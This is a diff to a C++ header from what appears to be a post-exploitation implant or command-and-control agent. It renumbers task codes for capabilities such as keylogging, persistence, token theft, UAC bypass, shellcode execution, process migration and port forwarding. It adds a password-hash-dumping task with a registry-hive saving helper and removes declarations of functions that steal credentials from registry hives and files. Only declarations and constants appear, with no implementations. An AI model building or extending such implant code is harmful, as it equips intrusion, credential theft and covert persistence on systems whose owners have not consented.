@@ -50,55 +50,44 @@
 #define TASK_ENV_LS             0x09
 #define TASK_FIND               0x10
 #define TASK_GROUP_LS           0x11
-#define TASK_HISTORY            0x12
-#define TASK_IP                 0x13
-#define TASK_JITTER             0x14
-#define TASK_KEYLOG             0x15
-#define TASK_KILL               0x16
-#define TASK_KILLDATE           0x17
-#define TASK_LS                 0x18
-#define TASK_MIGRATE            0x19
-#define TASK_MKDIR              0x20
-#define TASK_MV                 0x21
-#define TASK_NET                0x22
-#define TASK_PE                 0x23
-#define TASK_PERSIST            0x24
-#define TASK_PROCDUMP           0x25
-#define TASK_PS_KILL            0x26
-#define TASK_PS_LS              0x27
-#define TASK_PWD                0x28
-#define TASK_REG_QUERY          0x29
-#define TASK_RM                 0x30
-#define TASK_RMDIR              0x31
-#define TASK_RPORTFWD_ADD       0x32
-#define TASK_RPORTFWD_LS        0x33
-#define TASK_RPORTFWD_RM        0x34
-#define TASK_RUNAS              0x35
-#define TASK_SCREENSHOT         0x36
-#define TASK_SHELLCODE          0x37
-#define TASK_SLEEP              0x38
-#define TASK_TOKEN_REVERT       0x39
-#define TASK_TOKEN_STEAL        0x40
-#define TASK_UAC                0x41
-#define TASK_UPLOAD             0x42
-#define TASK_USER_LS            0x43
-#define TASK_WHOAMI             0x44
-#define TASK_WHOAMI_PRIV        0x45
+#define TASK_HASHDUMP           0x12
+#define TASK_HISTORY            0x13
+#define TASK_IP                 0x14
+#define TASK_JITTER             0x15
+#define TASK_KEYLOG             0x16
+#define TASK_KILL               0x17
+#define TASK_KILLDATE           0x18
+#define TASK_LS                 0x19
+#define TASK_MIGRATE            0x20
+#define TASK_MKDIR              0x21
+#define TASK_MV                 0x22
+#define TASK_NET                0x23
+#define TASK_PE                 0x24
+#define TASK_PERSIST            0x25
+#define TASK_PROCDUMP           0x26
+#define TASK_PS_KILL            0x27
+#define TASK_PS_LS              0x28
+#define TASK_PWD                0x29
+#define TASK_REG_QUERY          0x30
+#define TASK_RM                 0x31
+#define TASK_RMDIR              0x32
+#define TASK_RPORTFWD_ADD       0x33
+#define TASK_RPORTFWD_LS        0x34
+#define TASK_RPORTFWD_RM        0x35
+#define TASK_RUNAS              0x36
+#define TASK_SCREENSHOT         0x37
+#define TASK_SHELLCODE          0x38
+#define TASK_SLEEP              0x39
+#define TASK_TOKEN_REVERT       0x40
+#define TASK_TOKEN_STEAL        0x41
+#define TASK_UAC                0x42
+#define TASK_UPLOAD             0x43
+#define TASK_USER_LS            0x44
+#define TASK_WHOAMI             0x45
+#define TASK_WHOAMI_PRIV        0x46
 
 namespace Task
 {
-    namespace Helper::Creds
-    {
-        std::map<std::wstring, std::vector<std::wstring>> StealCredsFromRegistryHives(
-            const std::wstring& wUserSID
-        );
-        std::map<std::wstring, std::vector<std::wstring>> StealCredsFromFiles(
-            State::PSTATE pState,
-            const std::wstring& wUserName,
-            const std::wstring& wUserSID
-        );
-    }
-
     namespace Helper::Find
     {
         std::wstring FindFiles(
@@ -106,6 +95,11 @@ namespace Task
             const std::wstring& wPath,
             const std::wstring& wName
         );
+    }
+
+    namespace Helper::Hashdump
+    {
+        BOOL SaveRegHive(const std::wstring& wHiveKey, const std::wstring& wSavePath);
     }
 
     namespace Helper::KeyLog
@@ -148,6 +142,7 @@ namespace Task
     std::wstring EnvLs(State::PSTATE pState);
     std::wstring Find(State::PSTATE pState, const std::wstring& wPath, const std::wstring& wName);
     std::wstring GroupLs();
+    std::wstring Hashdump(State::PSTATE pState);
     std::wstring History(State::PSTATE pState);
     std::wstring Ip();
     std::wstring JitterSet(State::PSTATE pState, const std::wstring& wJitter);
